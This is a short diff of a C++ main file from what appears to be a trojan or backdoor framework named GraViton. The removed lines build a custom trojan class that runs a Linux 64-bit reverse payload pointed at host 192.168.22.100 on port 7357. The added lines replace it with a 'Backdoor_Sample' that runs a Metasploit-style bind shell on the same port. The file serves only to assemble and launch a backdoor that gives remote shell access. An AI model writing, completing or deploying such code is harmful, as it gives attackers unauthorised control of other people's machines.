@@ -37,32 +37,25 @@
 //#define GVN_LOG_FILE "./graviton_logs.txt"
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#include "../../../graviton.hpp"
-#include "../../../gvn_payload/linux/gvn_payload_linux64r.hpp"
-#include "../../../gvn_ai/gvn_ai_trojan_sample.hpp"
+#include <graviton.hpp>
+#include <payload/linux/msf_shell_bind_64.hpp>
+#include <ai/backdoor_sample.hpp>
 #include <iostream>
 using namespace std;
-
-class My_Trojan_AI : public AI_Trojan_Sample
-{
-protected:
-	virtual bool initializeInternalComponents()
-	{
-		payload = new Payload_Linux64r();
-		payload->initialize(options);
-	}
-};
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 int main()
 {
-	GraVitoN::Logger::logItLn ( "main -> Started" );
+    GraVitoN::Core::Logger::logItLn ( "main -> Started" );
 	
-	My_Trojan_AI ai;
-	ai.initialize("PORT=7357 HOST=192.168.22.100");
-	ai.run();
+    GraVitoN::Payload::Linux_MSF_Shell_Bind_64 msfpay;
+    msfpay.initialize(7357);
+
+    GraVitoN::AI::Backdoor_Sample backy(msfpay);
+
+    backy.run();
 	
-	GraVitoN::Logger::logItLn ( "main -> done" );
+    GraVitoN::Core::Logger::logItLn ( "main -> done" );
 	
     return 0;
 }
